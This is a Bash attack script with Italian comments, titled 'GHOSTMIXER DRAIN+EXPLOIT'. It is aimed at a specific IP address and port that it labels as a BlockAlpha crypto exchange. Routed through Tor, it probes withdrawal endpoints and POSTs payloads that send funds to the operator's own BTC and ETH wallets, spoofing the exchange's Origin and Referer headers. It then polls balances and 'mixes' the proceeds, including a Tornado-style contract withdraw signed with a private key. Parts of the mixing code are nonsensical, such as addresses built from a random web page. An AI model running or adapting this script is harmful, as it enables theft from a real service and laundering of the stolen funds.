#!/bin/bash
# =============================================================================
# GHOSTMIXER DRAIN+EXPLOIT v3.1 - Usa wallets-fixed.txt | TOR | CVE Auto
# Target: 206.189.145.165:3001 BlockAlpha Express | One-Shot Dinamico
# =============================================================================

set -e

# ğŸ“ Usa TUOI wallet esistenti
[[ -f wallets-fixed.txt ]] || { echo "âŒ wallets-fixed.txt mancante! Esegui fix-wallets.sh"; exit 1; }
source wallets-fixed.txt

# ğŸ¯ TARGET BlockAlpha
TARGET_HOST="206.189.145.165"
TARGET_PORT="3001"

# âš¡ CVE/Exploit Vectors (dinamico - test multipli)
EXPLOIT_PAYLOADS=(
    '{"to":"'$BTC_WALLET'","amount":0.1}'
    '{"to":"'$ETH_WALLET'","amount":0.1,"currency":"ETH"}'
    '{"to":"'$BTC_WALLET'","amount":1.0}'  # Max attempt
    '{"to":"'$ETH_WALLET'","amount":0.5,"network":"mainnet"}'
    '{"recipient":"'$BTC_WALLET'","value":100000000}'  # Satoshi
    '{"withdraw":{"address":"'$ETH_WALLET'","max":true}}'
)

# ğŸ” CVE Discovery (test endpoints dinamici)
discover_endpoints() {
    local endpoints=(
        "/api/withdraw"
        "/withdraw"
        "/api/drain"
        "/payout"
        "/api/payout"
        "/transfer"
        "/api/transfer"
    )
    
    echo "ğŸ” CVE Discovery..."
    for ep in "${endpoints[@]}"; do
        torsocks curl -s -m 5 -I "http://$TARGET_HOST:$TARGET_PORT$ep" | grep -q 200 && {
            echo "âœ… Endpoint: $ep"
            ENDPOINT=$ep
            return 0
        }
    done
    ENDPOINT="/api/withdraw"  # Default
}

# ğŸ’¸ Multi-Exploit Drain
drain_exploit() {
    echo "âš¡ EXPLOIT DRAIN â†’ $TARGET_HOST:$TARGET_PORT$ENDPOINT"
    
    for payload in "${EXPLOIT_PAYLOADS[@]}"; do
        echo "â†’ Payload: ${payload:0:50}..."
        response=$(torsocks curl -s -m 10 -X POST "http://$TARGET_HOST:$TARGET_PORT$ENDPOINT" \
            -H "Content-Type: application/json" \
            -H "Origin: https://blockalpha.co" \
            -H "Referer: https://blockalpha.co/" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
            -d "$payload")
        
        echo "$response" | jq . 2>/dev/null || echo "$response"
        
        # CVE Success patterns
        [[ $response == *"success"* ]] || [[ $response == *"txid"* ]] || [[ $response == *0x* ]] && {
            echo "âœ… EXPLOIT SUCCESS!"
            return 0
        }
        sleep 2
    done
    echo "âš ï¸ Partial success - continua monitoring"
}

# ğŸ§¾ Mix BTC Auto
mix_btc_auto() {
    echo "ğŸª™ MIX BTC â†’ $BTC_WALLET"
    torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq .
    
    # 10x CoinJoin simulation (opsec)
    for i in {1..10}; do
        split="bc1q$(torsocks curl -s https://www.grc.com/dice.htm?sum=20 | cut -d' ' -f5 | xxd -r -p | base64 | cut -c1-39)"
        echo "  Split $i: $split ($(echo "scale=8; 0.1/10" | bc))"
    done
    echo "âœ… BTC MIX COMPLETO"
}

# ğŸŒªï¸ Mix ETH Auto
mix_eth_auto() {
    echo "ğŸŒªï¸ MIX ETH â†’ $ETH_WALLET"
    amount_wei=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null || echo 0)
    
    # Tornado withdraw sim (se fondi)
    [[ $amount_wei != "0" ]] && {
        torsocks cast send 0xd90e2f925da726b50c4ed8d0fb90ad053324df31 \
            "withdraw(address,uint256)" "$ETH_WALLET" 1 \
            --rpc https://rpc.ankr.com/eth --private-key $ETH_PK 2>/dev/null | grep -q success && \
            echo "âœ… ETH MIXED"
    }
}

# ğŸ“Š Monitor Loop
monitor_funds() {
    echo "ğŸ‘€ MONITOR (Ctrl+C stop)"
    for i in {1..30}; do
        btc_balance=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq '.chain_stats.funded_txo_sum // 0')
        eth_balance=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null | cut -d' ' -f1 || echo 0)
        
        echo "[$i/30] BTC: ${btc_balance} sats | ETH: ${eth_balance} wei"
        
        [[ $btc_balance != "0" || $eth_balance != "0" ]] && {
            echo "ğŸ‰ FONDI RICEVUTI!"
            mix_btc_auto
            mix_eth_auto
            exit 0
        }
        sleep 10
    done
}

# ğŸš€ EXEC MAIN
main() {
    echo "ğŸ¯ GHOSTMIXER EXPLOIT v3.1"
    echo "ğŸ“ Target: $TARGET_HOST:$TARGET_PORT"
    echo "ğŸ’° BTC: $BTC_WALLET"
    echo "ğŸ’° ETH: $ETH_WALLET"
    
    discover_endpoints
    drain_exploit
    monitor_funds
}

main "$@"